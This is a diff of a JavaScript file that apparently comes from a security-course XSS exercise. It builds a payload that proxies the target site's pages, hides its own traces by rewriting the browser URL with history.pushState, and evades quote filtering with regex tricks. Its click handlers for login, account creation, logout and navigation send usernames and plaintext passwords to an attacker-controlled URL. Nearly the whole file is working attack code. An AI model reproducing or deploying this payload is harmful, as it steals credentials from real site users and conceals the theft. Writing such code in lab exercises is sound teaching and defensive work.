@@ -7,33 +7,45 @@ function historyF() {
 }
 function payload(attacker) {
 
-	function log(data) {
-		console.log($.param(data))
-		$.get(attacker, data);
-	}
+	var x = String(/.\/ /);
+	console.log(x);
+	x = x.substring(1,x.length-4) + x.substring(3,x.length-2);
+	console.log(x);
+	var y = /\//.source.substring(1);
+	console.log(y);
+	var link = /http:/.source + y+y+/trurl.cs.illinois.edu/.source+y;
+	console.log(link);
 	function proxy(href) {
 		$("html").load(href, function(){
 			$("html").show();
-			// log(attacker,{event:"nav", uri:href});
+			//log(attacker,{event:"nav", uri:href});
 			// $("#query").val("pwned!")
 			// is someone logged in
-			if ($("#logged-in-user".text()))
+			if ($(/#logged-in-user/.source).text())
 			{
 				// time to log 
-				log(attacker,{event:"nav", user:$("logged-in-user").text(),uri: href});
-				historyF();
+				$.get(attacker,{event:"nav", user:$(/#logged-in-user/.source).val(),uri: href});
+				//historyF();
+				// chagning the URL to hide our attack
+				history.pushState(null,null,'http://trurl.cs.illinois.edu/');
+				//testing 
+				$("#query").val("pwned!")
 			}
 			// no user 
 			else 
 			{
-
-				log(attacker,{event:"nav", uri:href});
-				historyF();
+				// time to log
+				$.get(attacker,{event:"nav", uri:href});
+				//historyF();
+				//changing the URL to hide our attack
+				history.pushState(null,null,'http://trurl.cs.illinois.edu/');
+				$("#query").val("pwned2!")
 			}
 
 			$("#search-btn").click(function(event)
 			{
 				//historyF();
+				// do not take default action
 				event.preventDefault();
 				q = $("#query").val();
 				history.pushState(null,null,'http://trurl.cs.illinois.edu/search?q=/'+q);
@@ -43,7 +55,8 @@ function payload(attacker) {
 
 			$("#search-again-btn").click(function(event)
 			{
-				historyF();
+				//historyF();
+				history.pushState(null,null,'http://trurl.cs.illinois.edu/');
 				event.preventDefault();
 				proxy(href)
 			});
@@ -51,16 +64,48 @@ function payload(attacker) {
 
 			$("#bungle-lnk").click(function(event) 
 			{
-				historyF();
+				//historyF();
+				history.pushState(null,null,'http://trurl.cs.illinois.edu/');
 				event.preventDefault();
 				proxy(href);
 			});
 
+			$("#log-out-btn").click(function(event)
+			{
+				$.get(attacker,{event: "logout", user:$("#username").val()});
+				$.post(link + $("#logout"), function(){
+					history.pushState(null,null,x);
+					proxy(x);
+				});
+			});
+		   $("#log-in-btn").click(function(event)
+		   {
+		   	event.preventDefault();
+		   	$.post(link + $("login"), 
+		   		{username: $("#username").val(),
+		   		 password: $("#userpass").val()},
+		   		 function() {
+		   		 	$.get(attacker,{event: "login", user: $("#username").val(),pass: $("#userpass").val()});
+		   		 	proxy(x);
+		   		 });
+		   });
+
+		   $("#new-account-btn").click(function(event)
+		   {
+		   	event.preventDefault();
+		   	$.post(link + /create/, {username: $("#username").val(),
+		    password: $("#userpass").val()},
+		    function(){
+		    	$.get(attacker,{event: "/create/", user: $("#username").val(), pass: $("#userpass").val()});
+		    	proxy(x);
+		    });
+		   });
 		});
 	}
 
 	$("html").hide();
-	proxy(attacker,"./");
+//	proxy(attacker,"./");
+	proxy(x);
 }
 function makeLink(xssdefense, target, attacker) {
 	if (xssdefense == 0) {
